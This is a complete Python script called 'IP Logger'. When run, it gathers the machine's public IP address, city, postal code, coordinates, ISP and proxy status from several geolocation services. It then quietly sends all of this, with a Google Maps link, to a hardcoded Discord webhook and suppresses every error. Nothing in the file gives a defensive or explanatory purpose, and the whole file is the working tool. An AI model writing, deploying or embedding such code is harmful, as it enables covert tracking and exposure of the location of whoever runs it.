import requests
import json
from datetime import datetime

WEBHOOK_URL = "https://discord.com/api/webhooks/1394927024128131203/qFswxQAhbqc-TqzFpamKHFnk6yV92-UqemeVWr0t-2xIyG2-KEHed9IzqnIA36meACRv"

def fetch_json(url, headers=None):
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return {}

def get_ip_data():
    ipinfo = fetch_json("https://ipinfo.io/json")
    ip = ipinfo.get("ip", "N/A")

    ipapi = fetch_json(f"http://ip-api.com/json/{ip}?fields=66846719")
    ipwho = fetch_json(f"https://ipwho.is/{ip}")

    data = {
        "IP": ip,
        "City": ipinfo.get("city", "N/A"),
        "Region": ipinfo.get("region", "N/A"),
        "Country": ipinfo.get("country", "N/A"),
        "Loc": ipinfo.get("loc", "N/A"),
        "Postal": ipinfo.get("postal", "N/A"),
        "Org": ipinfo.get("org", "N/A"),
        "Hostname": ipinfo.get("hostname", "N/A"),
        "Timezone": ipinfo.get("timezone", "N/A"),
        "ISP": ipapi.get("isp", "N/A"),
        "Proxy": str(ipapi.get("proxy", "N/A")),
        "Mobile": str(ipapi.get("mobile", "N/A")),
        "Hosting": str(ipapi.get("hosting", "N/A")),
        "Map": f"https://www.google.com/maps/search/?api=1&query={ipinfo.get('loc', '')}",
        "Timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }

    return data

def send_webhook(data):
    embed = {
        "title": "x IP Logger",
        "color": 0x1ABC9C,
        "fields": [
            {"name": "IP Address", "value": data.get("IP", "N/A"), "inline": True},
            {"name": "City", "value": data.get("City", "N/A"), "inline": True},
            {"name": "Region", "value": data.get("Region", "N/A"), "inline": True},
            {"name": "Country", "value": data.get("Country", "N/A"), "inline": True},
            {"name": "Postal Code", "value": data.get("Postal", "N/A"), "inline": True},
            {"name": "Organization", "value": data.get("Org", "N/A"), "inline": False},
            {"name": "Hostname", "value": data.get("Hostname", "N/A"), "inline": True},
            {"name": "ISP", "value": data.get("ISP", "N/A"), "inline": True},
            {"name": "Proxy", "value": data.get("Proxy", "N/A"), "inline": True},
            {"name": "Mobile Connection", "value": data.get("Mobile", "N/A"), "inline": True},
            {"name": "Hosting", "value": data.get("Hosting", "N/A"), "inline": True},
            {"name": "Timezone", "value": data.get("Timezone", "N/A"), "inline": True},
            {"name": "Google Maps", "value": f"[View Location]({data.get('Map', '')})", "inline": False},
        ],
        "footer": {
            "text": f"Logged at {data.get('Timestamp', '')}",
            "icon_url": "https://i.pinimg.com/736x/6b/9e/20/6b9e208c95b0d7cab2d903246b9915e6.jpg"
        },
        "thumbnail": {
            "url": "https://i.pinimg.com/736x/6b/9e/20/6b9e208c95b0d7cab2d903246b9915e6.jpg"
        }
    }

    payload = {
        "username": "IP Logger",
        "avatar_url": "https://i.pinimg.com/736x/6b/9e/20/6b9e208c95b0d7cab2d903246b9915e6.jpg",
        "embeds": [embed]
    }

    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except:
        pass

def main():
    data = get_ip_data()
    send_webhook(data)

if __name__ == "__main__":
    main()
